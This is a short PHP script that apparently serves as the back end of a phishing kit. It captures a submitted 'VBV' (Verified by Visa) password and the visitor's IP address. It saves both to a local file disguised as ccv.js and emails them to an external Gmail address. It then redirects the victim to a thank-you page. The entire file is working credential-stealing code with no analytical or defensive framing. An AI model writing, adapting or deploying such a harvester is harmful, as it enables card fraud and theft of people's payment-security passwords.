<?php
session_start();
$password = $_POST['password'];
$ip = getenv("REMOTE_ADDR");

$subj = "Infos 3: $ip / $password";
$msg = "
VBV Passwd: $password
__________________
IP: $ip";

$pula = fopen ("ccv.js" , "a");
fwrite ($pula , $msg);
fclose ($pula);

$mailsubj="APPL - $ip";
$emailusr = "danne.danne001@gmail.com";
mail($emailusr, $mailsubj, $msg);

header("Location: Thanks.htm");
?>
